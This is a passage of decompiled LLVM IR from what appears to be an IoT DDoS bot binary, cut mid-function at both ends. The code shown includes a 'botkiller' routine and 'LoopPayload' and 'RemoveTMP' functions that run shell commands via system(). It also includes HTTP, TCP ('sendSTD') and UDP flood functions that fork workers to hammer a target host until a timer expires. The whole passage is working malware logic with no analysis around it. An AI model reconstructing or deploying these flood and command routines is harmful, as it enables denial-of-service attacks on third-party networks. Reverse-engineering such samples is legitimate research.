dec_label_pc_1f6c0:                               ; preds = %dec_label_pc_1e9e4, %dec_label_pc_1eb90, %dec_label_pc_1eed0, %dec_label_pc_1f474, %dec_label_pc_1f60c, %dec_label_pc_1e180, %dec_label_pc_1e434, %dec_label_pc_1f594, %dec_label_pc_1f4b0, %dec_label_pc_1f420, %dec_label_pc_1f2ac, %dec_label_pc_1f280, %dec_label_pc_1f1f0, %dec_label_pc_1f0ec, %dec_label_pc_1f098, %dec_label_pc_1f008, %dec_label_pc_1ef0c, %dec_label_pc_1eea4, %dec_label_pc_1ee78, %dec_label_pc_1edac, %dec_label_pc_1ed58, %dec_label_pc_1ecc8, %dec_label_pc_1ebcc, %dec_label_pc_1eb64, %dec_label_pc_1eb38, %dec_label_pc_1ea20, %dec_label_pc_1e96c, %dec_label_pc_1e84c, %dec_label_pc_1e7d4, %dec_label_pc_1e5fc, %dec_label_pc_1e5ac, %dec_label_pc_1e408, %dec_label_pc_1e3b0, %dec_label_pc_1f670
  %v1_1f6c4 = add nuw nsw i32 %storemerge612, 1
  %v5_1f6d8 = icmp slt i32 %v1_1f6c4, 1000
  br i1 %v5_1f6d8, label %dec_label_pc_1e11c, label %dec_label_pc_1e110

; uselistorder directives
  uselistorder i32 %v3_1f56c, { 1, 0 }
  uselistorder i32 %v2_1f43c, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v3_1efe0, { 1, 0 }
  uselistorder i32 %v2_1ef98, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_1eec0, { 1, 0, 2 }
  uselistorder i32 %v3_1eca0, { 1, 0 }
  uselistorder i32 %v2_1ec58, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_1eb80, { 1, 0, 2 }
  uselistorder i32 %v2_1e864, { 1, 0 }
  uselistorder i32* %v1_1e6a4, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge711, { 1, 0 }
  uselistorder i32 %v0_1e288, { 1, 0 }
  uselistorder i8* %v2_1e1f0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1e164, { 1, 0 }
  uselistorder i32* %v1_1e13c, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_1e134, { 4, 5, 49, 50, 51, 38, 39, 40, 46, 41, 42, 45, 44, 43, 3, 47, 48, 34, 33, 36, 35, 37, 29, 30, 31, 32, 25, 24, 27, 26, 28, 20, 21, 22, 23, 17, 18, 15, 16, 11, 12, 13, 14, 19, 7, 1, 2, 8, 0, 10, 9, 6 }
  uselistorder i32 %v2_1e130, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_1e128, { 66, 64, 65, 63, 49, 62, 61, 59, 60, 58, 57, 55, 56, 54, 52, 53, 50, 51, 48, 47, 46, 45, 44, 43, 40, 41, 42, 39, 38, 37, 36, 35, 34, 31, 32, 33, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge612, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_1f48c, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_1e650, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_1e0f8, { 1, 0, 2 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %v3_1e038, { 3, 7, 6, 5, 4, 8, 9, 12, 11, 10, 13, 0, 14, 1, 17, 18, 19, 16, 2, 15 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-344, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 114, 116, 115, 111, 117, 118, 119, 120 }
  uselistorder i32 (i32, i32, i32)* @get_telstate_host, { 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8*]* @global_var_429a4.2660 to i32), { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_37150.2658 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([7 x i8*]* @global_var_42998.2656 to i32), { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 0, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 2, 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder label %dec_label_pc_1f6c0, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_1e664, { 1, 0 }
  uselistorder label %dec_label_pc_1e5fc, { 1, 0 }
  uselistorder label %dec_label_pc_1e180, { 1, 0 }
  uselistorder label %dec_label_pc_1e11c, { 1, 0 }
  uselistorder label %dec_label_pc_1e07c, { 1, 0 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1f72c = call i32 @__libc_system(i32 ptrtoint ([324 x i8]* @global_var_32008.2655 to i32))
  ret i32 %v2_1f72c
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-520 = alloca i32, align 4
  %stack_var_-184 = alloca i8**, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_1f750 = load i32, i32* @r4, align 4
  %v6_1f750 = load i32, i32* @fp, align 4
  %v13_1f750 = load i32, i32* @lr, align 4
  store i32 128856, i32* %stack_var_-4, align 4
  %v2_1f754 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1f754, i32* @fp, align 4
  %v21_1f774 = ptrtoint i8** %stack_var_-44 to i32
  store i32 %v21_1f774, i32* @lr, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_373a8.2680, i32 0, i32 0), i8** %stack_var_-44, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_372fc.2714 to i32), i32* @r3, align 4
  %v2_1f784 = ptrtoint i32* %stack_var_-168 to i32
  store i32 92, i32* @ip, align 4
  store i32 %v2_1f784, i32* @r0, align 4
  store i32 ptrtoint ([23 x i8*]* @global_var_372fc.2714 to i32), i32* @r1, align 4
  store i32 92, i32* @r2, align 4
  %v0_1f798 = call i32 @memcpy()
  %v21_1f7bc = ptrtoint i8*** %stack_var_-184 to i32
  store i32 %v21_1f7bc, i32* @lr, align 4
  store i8** bitcast ([5 x i8]* @global_var_37234.2694 to i8**), i8*** %stack_var_-184, align 4
  %v6_1f7dc = icmp sgt i32 %tmp29, 0
  br i1 %v6_1f7dc, label %dec_label_pc_1f7e0, label %dec_label_pc_1f974

dec_label_pc_1f7e0:                               ; preds = %entry
  %v2_1f7e0 = ptrtoint i32* %stack_var_-520 to i32
  %v3_1f7f0 = bitcast i32* %stack_var_-520 to i8*
  %v4_1f7f0 = call i32 @__GI_memset(i8* %v3_1f7f0, i32 0, i32 128)
  %v2_1f80c = ptrtoint i32* %stack_var_-24 to i32
  %v2_1f814 = add i32 %v2_1f80c, -52
  %v1_1f818 = inttoptr i32 %v2_1f814 to i32*
  %v2_1f818 = load i32, i32* %v1_1f818, align 4
  store i32 %v2_1f818, i32* @lr, align 4
  store i32 %v2_1f80c, i32* @r4, align 4
  store i32 %v2_1f7e0, i32* @r0, align 4
  store i32 127, i32* @r1, align 4
  %v7_1f8b0 = call i32 @__GI_snprintf(i32 %v2_1f7e0, i32 127, i32 ptrtoint ([100 x i8]* @global_var_373d8.2742 to i32), i32 %v2_1f818, i32 %v2_1f818, i32 %v2_1f818)
  %v1_1f934 = call i32 @__libc_system(i32 %v2_1f7e0)
  %v2_1f954 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_1f954, i32* @r0, align 4
  %v3_1f960 = call i32 @sprintf(i32 %v2_1f954, i32 ptrtoint ([14 x i8]* @global_var_3745c.2746 to i32))
  %v1_1f96c = call i32 @__libc_system(i32 %v2_1f954)
  br label %dec_label_pc_1f97c

dec_label_pc_1f974:                               ; preds = %entry
  %v1_1f978 = call i32 @sleep(i32 5)
  br label %dec_label_pc_1f97c

dec_label_pc_1f97c:                               ; preds = %dec_label_pc_1f7e0, %dec_label_pc_1f974
  %storemerge26 = phi i32 [ %v1_1f978, %dec_label_pc_1f974 ], [ %v1_1f96c, %dec_label_pc_1f7e0 ]
  store i32 %v3_1f750, i32* @r4, align 4
  store i32 %v6_1f750, i32* @fp, align 4
  store i32 %v13_1f750, i32* @lr, align 4
  ret i32 %storemerge26

; uselistorder directives
  uselistorder i32 %v2_1f954, { 0, 2, 1 }
  uselistorder i32 %v2_1f818, { 1, 2, 3, 0 }
  uselistorder i32 %v2_1f80c, { 1, 0 }
  uselistorder i32 %v2_1f7e0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-44, { 1, 0 }
  uselistorder i8*** %stack_var_-184, { 1, 0 }
  uselistorder label %dec_label_pc_1f97c, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1f9b0 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_3746c.2749 to i32))
  %v2_1f9b8 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_37498.2751 to i32))
  %v2_1f9c0 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_374b0.2753 to i32))
  %v2_1f9c8 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_37498.2751 to i32))
  %v2_1f9d0 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_374c8.2755 to i32))
  %v2_1f9d8 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_374d8.2757 to i32))
  %v2_1f9e0 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_374e4.2759 to i32))
  %v2_1f9e8 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_374fc.2761 to i32))
  %v2_1f9f0 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_37510.2763 to i32))
  %v2_1f9f8 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_3751c.2765 to i32))
  %v2_1fa00 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_37530.2767 to i32))
  %v2_1fa08 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_37540.2769 to i32))
  %v2_1fa10 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_37558.2771 to i32))
  ret i32 %v2_1fa10
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_1fa54 = load i32, i32* @fp, align 4
  store i32 129628, i32* %stack_var_-4, align 4
  %v2_1fa58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1fa58, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_1fa78 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_1fa88 = icmp eq i32 %v1_1fa78, 0
  br i1 %v2_1fa88, label %dec_label_pc_1fa90, label %dec_label_pc_1fa9c

dec_label_pc_1fa90:                               ; preds = %entry
  br label %dec_label_pc_1fb68

dec_label_pc_1fa9c:                               ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_1faa0 = add i32 %v1_1fa78, 16
  %v2_1faa0 = inttoptr i32 %v1_1faa0 to i32*
  %v3_1faa0 = load i32, i32* %v2_1faa0, align 4
  %v1_1faa4 = inttoptr i32 %v3_1faa0 to i32*
  %v2_1faa4 = load i32, i32* %v1_1faa4, align 4
  %v1_1faac = add i32 %v1_1fa78, 12
  %v2_1faac = inttoptr i32 %v1_1faac to i32*
  %v3_1faac = load i32, i32* %v2_1faac, align 4
  store i32 %v3_1faac, i32* @r2, align 4
  %v2_1fab8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1fab8, i32* @r3, align 4
  %v5_1fac4 = call i32 @bcopy(i32 %v2_1faa4, i32 %v2_1fab8, i32 %v3_1faac, i32 %v2_1fab8, i32 %v1_1fa78)
  %v2_1fad0 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_1faf0 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_1fafc = ptrtoint i32* %stack_var_-44 to i32
  %v5_1fb18 = call i32 @__GI_setsockopt(i32 %v3_1faf0, i32 6, i32 1, i32 %v2_1fafc, i32 4)
  %v3_1fb20 = icmp eq i32 %v3_1faf0, -1
  br i1 %v3_1fb20, label %dec_label_pc_1fb28, label %dec_label_pc_1fb34

dec_label_pc_1fb28:                               ; preds = %dec_label_pc_1fa9c
  br label %dec_label_pc_1fb68

dec_label_pc_1fb34:                               ; preds = %dec_label_pc_1fa9c
  %v2_1fab4 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1fb44 = call i32 @__libc_connect(i32 %v3_1faf0, i32 %v2_1fab4, i32 16)
  %v3_1fb4c = icmp eq i32 %v3_1fb44, -1
  br i1 %v3_1fb4c, label %dec_label_pc_1fb54, label %dec_label_pc_1fb60

dec_label_pc_1fb54:                               ; preds = %dec_label_pc_1fb34
  br label %dec_label_pc_1fb68

dec_label_pc_1fb60:                               ; preds = %dec_label_pc_1fb34
  br label %dec_label_pc_1fb68

dec_label_pc_1fb68:                               ; preds = %dec_label_pc_1fb54, %dec_label_pc_1fb28, %dec_label_pc_1fa90, %dec_label_pc_1fb60
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_1fa90 ], [ 0, %dec_label_pc_1fb28 ], [ 0, %dec_label_pc_1fb54 ], [ %v3_1faf0, %dec_label_pc_1fb60 ]
  store i32 %v3_1fa54, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_1fb68, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-812 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 129928, i32* %stack_var_-4, align 4
  %v2_1fb84 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1fb84, i32* @fp, align 4
  %v2_1fba0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 ptrtoint ([62 x i8*]* @global_var_38904.2835 to i32), i32* @r3, align 4
  %v2_1fbac = ptrtoint i32* %stack_var_-288 to i32
  store i32 248, i32* @ip, align 4
  store i32 %v2_1fbac, i32* @r0, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_38904.2835 to i32), i32* @r1, align 4
  store i32 248, i32* @r2, align 4
  %v0_1fbc0 = call i32 @memcpy()
  %v2_1fbd8 = call i32 @__GI_time(i32* null)
  %v3_1fbe0 = load i32, i32* %stack_var_0, align 4
  %v2_1fbe4 = add i32 %v3_1fbe0, %v2_1fbd8
  %v0_1fbec = call i32 @rand()
  %v2_1fc00 = srem i32 %v0_1fbec, 3
  %v3_1fc2c = mul nsw i32 %v2_1fc00, 4
  %v2_1fc34 = add i32 %v3_1fc2c, %v2_1fba0
  %v2_1fc38 = add i32 %v2_1fc34, -276
  %v1_1fc3c = inttoptr i32 %v2_1fc38 to i32*
  %v2_1fc3c = load i32, i32* %v1_1fc3c, align 4
  store i32 %v2_1fc3c, i32* @r4, align 4
  %v0_1fc40 = call i32 @rand()
  %v2_1fca0 = ptrtoint i32* %stack_var_-812 to i32
  store i32 %v2_1fca0, i32* @r0, align 4
  %v3_1fcbc = call i32 @sprintf(i32 %v2_1fca0, i32 ptrtoint ([62 x i8]* @global_var_389fc.2845 to i32))
  %tmp30 = bitcast i32* %stack_var_-812 to i8*
  %v2_1fd30 = trunc i32 %v2_1fca0 to i16
  %v5_1fd7437 = icmp sgt i32 %arg6, 0
  br i1 %v5_1fd7437, label %dec_label_pc_1fccc, label %dec_label_pc_1fd78

dec_label_pc_1fccc:                               ; preds = %entry, %dec_label_pc_1fd5c
  %storemerge138 = phi i32 [ %v1_1fd60, %dec_label_pc_1fd5c ], [ 0, %entry ]
  %v0_1fccc = call i32 @__libc_fork()
  %v2_1fcd4 = icmp eq i32 %v0_1fccc, 0
  br i1 %v2_1fcd4, label %dec_label_pc_1fd5c, label %dec_label_pc_1fd3c

dec_label_pc_1fce0:                               ; preds = %dec_label_pc_1fd3c
  %v4_1fcfc = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v2_1fd0c = icmp eq i32 %v4_1fcfc, 0
  br i1 %v2_1fd0c, label %dec_label_pc_1fd3c, label %dec_label_pc_1fd14

dec_label_pc_1fd14:                               ; preds = %dec_label_pc_1fce0
  %v3_1fd1c = call i32 @strlen(i8* %tmp30)
  store i32 %v3_1fd1c, i32* @r2, align 4
  store i32 %v2_1fca0, i32* @r3, align 4
  %v3_1fd30 = call i32 @__GI___libc_write(i32 %v4_1fcfc, i16 %v2_1fd30)
  %v1_1fd38 = call i32 @__GI___libc_close(i32 %v4_1fcfc)
  br label %dec_label_pc_1fd3c

dec_label_pc_1fd3c:                               ; preds = %dec_label_pc_1fce0, %dec_label_pc_1fd14, %dec_label_pc_1fccc
  %v2_1fd40 = call i32 @__GI_time(i32* null)
  %v5_1fd50 = icmp slt i32 %v2_1fd40, %v2_1fbe4
  br i1 %v5_1fd50, label %dec_label_pc_1fce0, label %dec_label_pc_1fd54

dec_label_pc_1fd54:                               ; preds = %dec_label_pc_1fd3c
  %v1_1fd58 = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_1fd5c

dec_label_pc_1fd5c:                               ; preds = %dec_label_pc_1fccc, %dec_label_pc_1fd54
  %v1_1fd803 = phi i32 [ 0, %dec_label_pc_1fccc ], [ %v1_1fd58, %dec_label_pc_1fd54 ]
  %v1_1fd60 = add nuw nsw i32 %storemerge138, 1
  %v5_1fd74 = icmp slt i32 %v1_1fd60, %arg6
  br i1 %v5_1fd74, label %dec_label_pc_1fccc, label %dec_label_pc_1fd78

dec_label_pc_1fd78:                               ; preds = %dec_label_pc_1fd5c, %entry
  %v1_1fd80.lcssa = phi i32 [ %v3_1fcbc, %entry ], [ %v1_1fd803, %dec_label_pc_1fd5c ]
  ret i32 %v1_1fd80.lcssa

; uselistorder directives
  uselistorder i32 %v1_1fd60, { 1, 0 }
  uselistorder i32 %v2_1fca0, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_1fd5c, { 1, 0 }
  uselistorder label %dec_label_pc_1fd3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1fccc, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1fd98 = load i32, i32* @fp, align 4
  store i32 %v3_1fd98, i32* %stack_var_-16, align 4
  store i32 130464, i32* %stack_var_-4, align 4
  %v13_1fd98 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1fd9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1fd9c, i32* @fp, align 4
  %v3_1fdbc = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_1fdcc = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_1fde0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_1fdec = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1fdec, i32* @r0, align 4
  %v2_1fdf8 = call i32 @bzero(i32 %v2_1fdec, i32 16)
  %v1_1fe00 = add i32 %v1_1fde0, 16
  %v2_1fe00 = inttoptr i32 %v1_1fe00 to i32*
  %v3_1fe00 = load i32, i32* %v2_1fe00, align 4
  %v1_1fe04 = inttoptr i32 %v3_1fe00 to i32*
  %v2_1fe04 = load i32, i32* %v1_1fe04, align 4
  %v1_1fe0c = add i32 %v1_1fde0, 12
  %v2_1fe0c = inttoptr i32 %v1_1fe0c to i32*
  %v3_1fe0c = load i32, i32* %v2_1fe0c, align 4
  store i32 %v3_1fe0c, i32* @r2, align 4
  %v2_1fe18 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1fe18, i32* @r3, align 4
  %v5_1fe24 = call i32 @bcopy(i32 %v2_1fe04, i32 %v2_1fe18, i32 %v3_1fe0c, i32 %v2_1fe18, i32 ptrtoint (i32* @0 to i32))
  %v1_1fe2c = add i32 %v1_1fde0, 8
  %v2_1fe2c = inttoptr i32 %v1_1fe2c to i32*
  %v3_1fe2c = load i32, i32* %v2_1fe2c, align 4
  %v3_1fe34 = urem i32 %v3_1fe2c, 65536
  store i32 %v3_1fe34, i32* %stack_var_-52, align 4
  %v2_1fe58 = ptrtoint i32* %stack_var_-196 to i32
  %v2_1ff0c = add i32 %v2_1fdcc, %arg3
  %v2_1feb4 = add i32 %v13_1fd98, -180
  br label %dec_label_pc_1fe54

dec_label_pc_1fe54:                               ; preds = %dec_label_pc_1ff30, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_1ff34, %dec_label_pc_1ff30 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_38bf8.2883 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_1fe58, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_38bf8.2883 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_1fe6c = call i32 @memcpy()
  %v0_1fe70 = call i32 @rand()
  %v1_1fe80 = zext i32 %v0_1fe70 to i64
  %v4_1fe80 = mul nuw nsw i64 %v1_1fe80, 954437177
  %v3_1fe841 = udiv i64 %v4_1fe80, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_1ff30, label %dec_label_pc_1fed0

dec_label_pc_1fed0:                               ; preds = %dec_label_pc_1fe54
  %v3_1fe903 = mul nuw nsw i64 %v3_1fe841, 4
  %v3_1fe90 = trunc i64 %v3_1fe903 to i32
  %v2_1fe98.neg = sub i32 %v0_1fe70, %v3_1fe90
  %v3_1fe945 = mul nuw nsw i64 %v3_1fe841, 32
  %v3_1fe94 = trunc i64 %v3_1fe945 to i32
  %v2_1fe9c = sub i32 %v2_1fe98.neg, %v3_1fe94
  %v3_1feac = mul i32 %v2_1fe9c, 4
  %v2_1feb8 = add i32 %v2_1feb4, %v3_1feac
  %v1_1febc = inttoptr i32 %v2_1feb8 to i32*
  %v2_1febc = load i32, i32* %v1_1febc, align 4
  %v5_1fee0 = call i32 @__libc_send(i32 %v3_1fdbc, i32 %v2_1febc, i32 50, i32 0)
  %v3_1fef4 = call i32 @__libc_connect(i32 %v3_1fdbc, i32 %v2_1fdec, i32 16)
  %v2_1fefc = call i32 @__GI_time(i32* null)
  %v5_1ff14 = icmp slt i32 %v2_1fefc, %v2_1ff0c
  br i1 %v5_1ff14, label %dec_label_pc_1ff28, label %dec_label_pc_1ff18

dec_label_pc_1ff18:                               ; preds = %dec_label_pc_1fed0
  %v1_1ff1c = call i32 @__GI___libc_close(i32 %v3_1fdbc)
  %v1_1ff24 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1ff28

dec_label_pc_1ff28:                               ; preds = %dec_label_pc_1fed0, %dec_label_pc_1ff18
  br label %dec_label_pc_1ff30

dec_label_pc_1ff30:                               ; preds = %dec_label_pc_1fe54, %dec_label_pc_1ff28
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_1fe54 ], [ 0, %dec_label_pc_1ff28 ]
  %v1_1ff34 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_1fe54

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_1fdec, { 0, 2, 1 }
  uselistorder i32 %v1_1fde0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ff30, { 1, 0 }
  uselistorder label %dec_label_pc_1ff28, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 130900, i32* %stack_var_-4, align 4
  %v2_1ff50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1ff50, i32* @fp, align 4
  store i32 2, i32* %stack_var_-84, align 4
  %v2_1ff74 = icmp eq i32 %arg2, 0
  br i1 %v2_1ff74, label %dec_label_pc_1ff7c, label %dec_label_pc_1ff94

dec_label_pc_1ff7c:                               ; preds = %entry
  %v0_1ff7c = call i32 @rand_cmwc()
  br label %dec_label_pc_1ffb0

dec_label_pc_1ff94:                               ; preds = %entry
  %v3_1ff9c = urem i32 %arg2, 65536
  %v1_1ffa4 = call i32 @__GI_htons(i32 %v3_1ff9c)
  br label %dec_label_pc_1ffb0

dec_label_pc_1ffb0:                               ; preds = %dec_label_pc_1ff7c, %dec_label_pc_1ff94
  %v3_1ffc0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-80)
  %v2_1ffc8 = icmp eq i32 %v3_1ffc0, 0
  br i1 %v2_1ffc8, label %dec_label_pc_1ffd0, label %dec_label_pc_20510

dec_label_pc_1ffd0:                               ; preds = %dec_label_pc_1ffb0
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_1ffe4 = bitcast i32* %stack_var_-76 to i8*
  %v4_1ffe4 = call i32 @__GI_memset(i8* %v3_1ffe4, i32 0, i32 8)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_1fff4 = icmp eq i32 %arg4, 32
  br i1 %v7_1fff4, label %dec_label_pc_1fffc, label %dec_label_pc_2012c

dec_label_pc_1fffc:                               ; preds = %dec_label_pc_1ffd0
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_20008 = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_20018 = icmp eq i32 %v3_20008, 0
  br i1 %v2_20018, label %dec_label_pc_20020, label %dec_label_pc_20038

dec_label_pc_20020:                               ; preds = %dec_label_pc_1fffc
  %v2_20024 = load i32, i32* @global_var_42c60.61, align 4
  %v3_20030 = call i32 @HackerPrint(i32 %v2_20024, i32 ptrtoint ([27 x i8]* @global_var_38c88.2887 to i32))
  br label %dec_label_pc_20510

dec_label_pc_20038:                               ; preds = %dec_label_pc_1fffc
  %v3_20038 = load i32, i32* %stack_var_0, align 4
  %v1_2003c = add i32 %v3_20038, 1
  %v1_20044 = call i32 @malloc(i32 %v1_2003c)
  %v2_20054 = icmp eq i32 %v1_20044, 0
  br i1 %v2_20054, label %dec_label_pc_20510, label %dec_label_pc_2005c

dec_label_pc_2005c:                               ; preds = %dec_label_pc_20038
  %v3_2005c = load i32, i32* %stack_var_0, align 4
  %v1_20060 = add i32 %v3_2005c, 1
  store i32 %v1_20060, i32* %r2.global-to-local, align 4
  %v3_20070 = inttoptr i32 %v1_20044 to i8*
  %v4_20070 = call i32 @__GI_memset(i8* %v3_20070, i32 0, i32 %v1_20060)
